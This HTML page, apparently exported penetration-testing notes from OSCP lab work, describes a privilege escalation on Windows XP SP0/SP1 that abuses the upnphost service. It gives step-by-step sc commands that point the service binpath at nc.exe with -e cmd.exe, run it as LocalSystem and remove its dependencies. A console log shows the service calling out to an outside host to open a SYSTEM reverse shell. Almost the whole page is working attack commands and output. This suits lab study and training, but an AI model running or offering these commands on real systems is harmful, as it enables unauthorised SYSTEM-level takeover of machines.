<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows XP SP0,SP1 - upnphost</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># upnphost</h1></strong><br />In Windows XP SP0 and SP1, <code>upnphost</code> can be used (sort of) as a universal local privilege escalation.<br />The vuln was resolved in SP2.<br /><br /><strong>Examples</strong><br />â€¢ oscp Bob - 10.11.1.14<br /><br /><strong><h2>## How-to</h2></strong><br />1. Edit binpath to reverse shell<br /><code>sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</code><br /><br />2. Have service start as SYSTEM<br /><code>sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</code><br /><br />3. Start service (make to set up listener to catch reverse shell)<br /><code>net start upnphost</code><br /><br />4. Fails because of dependency?<br />Try the following:<br /><code>sc config SSDPSRV start= auto<br />net start SSDPSRV<br />net start upnphost</code><br /><br />Or try removing the dependency altogether (works better):<br /><code>sc config upnphost depend= &quot;&quot;</code><br /><br />5. Shell dies after N seconds?<br />If the shell dies, send a 2nd reverse shell from your SYSTEM shell to a 2nd listener.<br />That shell won&#39;t die because it&#39;s not tied to the exploited upnphost services, which terminates for whatever reason.<br /><br /><div class="codebox"><div class="codebox">C:\&gt;&nbsp;accesschk-XP.exe&nbsp;-uwcqv&nbsp;&quot;Authenticated&nbsp;Users&quot;&nbsp;*&nbsp;/accepteula<br />RW&nbsp;SSDPSRV<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />RW&nbsp;upnphost<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br /><br />C:\&gt;&nbsp;accesschk-XP.exe&nbsp;-ucqv&nbsp;upnphost&nbsp;/accepteula<br /><br />upnphost<br /><br />&nbsp;&nbsp;RW&nbsp;NT&nbsp;AUTHORITY\SYSTEM<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />&nbsp;&nbsp;RW&nbsp;BUILTIN\Administrators<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />&nbsp;&nbsp;RW&nbsp;NT&nbsp;AUTHORITY\Authenticated&nbsp;Users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />&nbsp;&nbsp;RW&nbsp;BUILTIN\Power&nbsp;Users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />&nbsp;&nbsp;RW&nbsp;NT&nbsp;AUTHORITY\LOCAL&nbsp;SERVICE<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_ALL_ACCESS<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />C:\&gt;&nbsp;sc&nbsp;qc&nbsp;upnphost<br /><br />[SC]&nbsp;GetServiceConfig&nbsp;SUCCESS<br /><br />SERVICE_NAME:&nbsp;upnphost<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;20&nbsp;&nbsp;WIN32_SHARE_PROCESS<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;START_TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;3&nbsp;&nbsp;&nbsp;DEMAND_START<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ERROR_CONTROL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1&nbsp;&nbsp;&nbsp;NORMAL<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BINARY_PATH_NAME&nbsp;&nbsp;&nbsp;:&nbsp;C:\WINDOWS\System32\svchost.exe&nbsp;-k&nbsp;LocalService<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOAD_ORDER_GROUP&nbsp;&nbsp;&nbsp;:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TAG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DISPLAY_NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Universal&nbsp;Plug&nbsp;and&nbsp;Play&nbsp;Device&nbsp;Host<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEPENDENCIES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;SSDPSRV<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_START_NAME&nbsp;:&nbsp;NT&nbsp;AUTHORITY\LocalService<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />C:\&gt;&nbsp;sc&nbsp;config&nbsp;upnphost&nbsp;binpath=&nbsp;&quot;C:\nc.exe&nbsp;-nv&nbsp;127.0.0.1&nbsp;9988&nbsp;-e&nbsp;C:\WINDOWS\System32\cmd.exe&quot;<br />[SC]&nbsp;ChangeServiceConfig&nbsp;SUCCESS<br /><br />C:\&gt;&nbsp;sc&nbsp;config&nbsp;upnphost&nbsp;obj=&nbsp;&quot;.\LocalSystem&quot;&nbsp;password=&nbsp;&quot;&quot;<br />[SC]&nbsp;ChangeServiceConfig&nbsp;SUCCESS<br /><br />C:\&gt;&nbsp;sc&nbsp;qc&nbsp;upnphost<br /><br />[SC]&nbsp;GetServiceConfig&nbsp;SUCCESS<br /><br />SERVICE_NAME:&nbsp;upnphost<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;20&nbsp;&nbsp;WIN32_SHARE_PROCESS<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;START_TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;3&nbsp;&nbsp;&nbsp;DEMAND_START<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ERROR_CONTROL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1&nbsp;&nbsp;&nbsp;NORMAL<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BINARY_PATH_NAME&nbsp;&nbsp;&nbsp;:&nbsp;C:\nc.exe&nbsp;-nv&nbsp;10.11.0.42&nbsp;9003&nbsp;-e&nbsp;C:\WINDOWS\System32\cmd.exe<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOAD_ORDER_GROUP&nbsp;&nbsp;&nbsp;:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TAG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DISPLAY_NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Universal&nbsp;Plug&nbsp;and&nbsp;Play&nbsp;Device&nbsp;Host<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEPENDENCIES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;SSDPSRV<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_START_NAME&nbsp;:&nbsp;LocalSystem<br />		<br />C:\&gt;&nbsp;net&nbsp;start&nbsp;upnphost</div></div><br /><br /><br /><br /></div>
</body>
</html>
